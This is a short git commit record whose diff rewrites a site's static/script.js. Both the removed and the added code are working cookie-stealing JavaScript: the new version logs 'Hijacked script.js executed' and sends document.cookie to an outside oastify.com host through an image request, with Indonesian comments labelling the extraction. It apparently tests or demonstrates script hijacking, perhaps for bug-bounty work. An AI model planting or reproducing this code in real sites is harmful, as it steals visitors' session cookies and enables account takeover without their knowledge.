714a083b227fa87e1689b90bdd5e5c533225c655
cyberrgen002 <cyberrgen002@gmail.com>
2026-01-02 13:47:53 +0700

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,5 +1,12 @@
-fetch("https://mukxdo1xp2okr74mjzun4847cyip6gu5.oastify.com/cookie?q=", {
-    method: "POST",
-    mode: "no-cors",
-    body: document.cookie
-});
+(function () {
+    // bukti eksekusi
+    console.log("Hijacked script.js executed");
+
+    // ekstraksi cookie
+    const data = encodeURIComponent(document.cookie);
+
+    // kirim ke endpoint relatif
+    const img = new Image();
+    img.src = "https://mukxdo1xp2okr74mjzun4847cyip6gu5.oastify.com/cookie?q=" + data;
+})();
+
